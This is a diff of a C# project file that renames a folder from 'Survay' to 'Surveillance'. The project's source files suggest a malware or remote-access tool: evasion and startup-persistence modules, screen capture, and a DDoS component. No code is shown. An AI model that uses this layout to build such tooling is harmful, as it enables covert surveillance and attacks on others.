@@ -53,7 +53,7 @@
   <ItemGroup>
     <Compile Include="Evading\Duplication.cs" />
     <Compile Include="Evading\Startup.cs" />
-    <Compile Include="Survay\CaptureScreen.cs" />
+    <Compile Include="Surveillance\CaptureScreen.cs" />
     <Compile Include="DDOS\DDOS.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
